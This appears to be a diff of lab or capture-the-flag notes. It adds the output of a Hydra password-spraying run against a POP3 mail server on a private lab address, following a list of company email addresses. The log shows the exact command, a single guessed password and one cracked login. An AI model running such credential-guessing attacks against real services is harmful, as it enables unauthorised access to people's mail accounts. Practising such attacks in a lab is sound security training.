@@ -36,3 +36,15 @@ pcathrine@brownbrick.co
 fstamatis@brownbrick.co
 
 
+oot@ip-10-10-196-188:~# hydra -L /root/Desktop/users -p bricks pop3://10.10.98.112
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-06 16:15:48
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:6/p:1), ~1 try per task
+[DATA] attacking pop3://10.10.98.112:110/
+[110][pop3] host: 10.10.98.112   login: lhedvig@brownbrick.co   password: bricks
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-06 16:15:49
+
+
